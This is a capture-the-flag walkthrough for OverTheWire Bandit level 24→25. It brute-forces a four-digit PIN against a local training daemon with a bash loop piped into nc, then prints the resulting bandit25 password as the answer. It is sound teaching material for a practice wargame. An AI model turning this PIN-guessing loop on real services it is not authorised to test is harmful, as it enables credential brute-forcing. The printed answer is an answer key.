# Bandit Level 24 → 25

## Goal

A daemon on **port 30002** wants a line of the form `<bandit24 password> <4-digit pin>`. If the pin is right, it returns `bandit25`'s password. You don't know the pin — there are only **10 000** possibilities (0000 through 9999) — so you brute-force them all.

## Concepts you'll learn

- Brute-forcing a small keyspace by generating all candidates and sending them
- Bash brace expansion for zero-padded number ranges (`{0000..9999}`)
- Piping a long stream into `nc` to send many attempts on a single connection

## Walkthrough

### 1. Log in as bandit24

```bash
$ ssh bandit24@bandit.labs.overthewire.org -p 2220
```

Use the password from [level 23 → 24](level23.md).

### 2. Poke the service manually first

```bash
$ nc localhost 30002
```

You'll see a prompt like:

```
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
```

Type `hello` and press Enter:

```
Wrong! Please enter the correct current password and pincode. Try again.
```

It gives you another attempt on the same connection — so you can fire 10 000 guesses down one TCP connection.

Press Ctrl-C to close.

### 3. Build a working directory

Same reason as level 23 — you don't own your home:

```bash
$ mkdir /tmp/mywork24
$ cd /tmp/mywork24
```

### 4. Generate all 10 000 attempts

```bash
$ for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ppOFOqa0ejqU $i"; done > attempts.txt
$ wc -l attempts.txt
10000 attempts.txt
```

A few things to notice:

- `{0000..9999}` is bash **brace expansion** — it emits every integer from 0000 to 9999 *with leading zeros preserved* because the starting value is written with leading zeros
- Replace the example password (`gb8KR...`) with your actual `bandit24` password — the one you just logged in with
- Each line is `<password> <pin>`, exactly the format the server wants

### 5. Send them

```bash
$ cat attempts.txt | nc localhost 30002 > responses.txt
```

Wait ~5–30 seconds for it to finish. Then filter the responses for the winner:

```bash
$ grep -v "Wrong!" responses.txt | grep -v "pincode checker" | grep -v "single line"
```

Expected output (something like):

```
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

`bandit25`'s password is the line after `Correct!`.

### 6. Log in as bandit25

```bash
$ ssh bandit25@bandit.labs.overthewire.org -p 2220
```

## The answer

The password for `bandit25` is:

**`iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/bandit/bandit24.html>
